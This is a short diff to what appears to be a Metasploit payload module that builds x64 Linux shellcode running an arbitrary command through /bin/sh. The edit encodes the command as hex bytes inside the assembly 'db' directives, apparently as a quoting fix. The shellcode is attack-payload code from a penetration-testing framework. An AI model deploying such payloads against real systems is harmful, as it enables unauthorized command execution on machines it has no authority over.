@@ -39,6 +39,7 @@ module MetasploitModule
 
   def generate(_opts = {})
     cmd = datastore['CMD'] || ''
+    cmd = cmd.bytes.map { |byte| "0x%02x" % byte }.join(', ')
     nullfreeversion = datastore['NullFreeVersion']
 
     if cmd.empty?
@@ -144,7 +145,7 @@ module MetasploitModule
             syscall                 ; execve("//bin/sh", ["//bin/sh", "-c", "*CMD*"], NULL)
           tocall:
             call afterjmp
-            db "#{cmd}"             ; arbitrary command
+            db #{cmd}               ; arbitrary command
         EOS
       else
         # 37 bytes without cmd (not null-free)
@@ -163,7 +164,7 @@ module MetasploitModule
 
             push rdx                ; NULL
             call continue
-            db "#{cmd}", 0x00       ; arbitrary command
+            db #{cmd}, 0x00         ; arbitrary command
           continue:
             push rsi                ; "-c"
             push rdi                ; "/bin/sh"
